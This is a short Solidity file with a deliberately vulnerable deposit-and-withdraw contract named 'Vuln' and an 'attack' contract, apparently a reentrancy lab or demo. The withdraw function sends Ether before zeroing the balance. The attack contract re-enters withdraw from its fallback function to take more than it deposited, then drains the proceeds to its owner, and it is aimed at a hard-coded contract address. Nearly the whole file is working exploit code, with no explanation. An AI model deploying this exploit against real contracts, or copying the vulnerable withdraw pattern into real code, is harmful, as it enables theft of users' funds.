pragma solidity ^0.5.0;

contract Vuln {
    mapping(address => uint256) public balances;
    bool public in_depo = false;
    address public sender = msg.sender;
    function deposit() public payable {
        // Increment their balance with whatever they pay
        in_depo = true;
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}


contract attack {
    address owner;
    uint ini_balance;
    
    Vuln vuln = Vuln(address(0xFB81aDf526904E3E71ca7C0d2dc841a94B1E203C));
    
    constructor () public{
        owner = msg.sender;
    }
    
    function deposit() public payable {
        vuln.deposit.value(msg.value)();
        ini_balance = address(this).balance;
        vuln.withdraw();
    }
    
    function () external payable {
        if((address(this).balance - ini_balance) < (2*(msg.value))) {
            vuln.withdraw();
        }
    }
    
    function drain() public {
        if(msg.sender == owner) {
            msg.sender.send(address(this).balance);    
        }
    }
}
